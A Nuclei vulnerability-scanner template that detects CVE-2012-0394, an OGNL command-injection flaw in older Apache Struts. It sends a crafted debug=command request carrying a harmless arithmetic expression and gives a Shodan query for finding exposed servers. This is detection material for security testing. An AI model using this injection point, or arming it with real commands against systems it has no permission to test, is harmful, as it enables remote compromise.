id: CVE-2012-0394
info:
  name: Apache Struts <2.3.1.1 - Remote Code Execution
  author: tess
  severity: critical
  description: Apache Struts before version 2.3.1.1 allows remote attackers to execute
    arbitrary OGNL commands and gain control of a compromised system.
  reference:
  - https://www.pwntester.com/blog/2014/01/21/struts-2-devmode-an-ognl-backdoor/
  - https://www.exploit-db.com/exploits/31434
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0394
  - http://www.exploit-db.com/exploits/18329
  - https://nvd.nist.gov/vuln/detail/CVE-2012-0394
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2012-0394
    cwe-id: CWE-77
  metadata:
    shodan-query: html:"Struts Problem Report"
    verified: 'true'
    impact: The impact of CVE-2012-0394 on Apache Struts <2.3.1.1 is that it allows
      for unauthorized remote code execution, potentially leading to compromising
      of sensitive information, modification of data, and full control of the system.
    recommendation: Upgrade to Apache Struts version 2.3.1.1 or later to prevent remote
      code execution through the DebuggingInterceptor component.
  tags: ognl,injection,edb,cve,cve2012,apache,struts
variables:
  first: '{{rand_int(1000, 9999)}}'
  second: '{{rand_int(1000, 9999)}}'
  result: '{{to_number(first)*to_number(second)}}'
requests:
- method: GET
  path:
  - '{{BaseURL}}/portal/displayAPSForm.action?debug=command&expression={{first}}*{{second}}'
  matchers-condition: and
  matchers:
  - type: word
    words:
    - '{{result}}'
  - type: status
    status:
    - 200
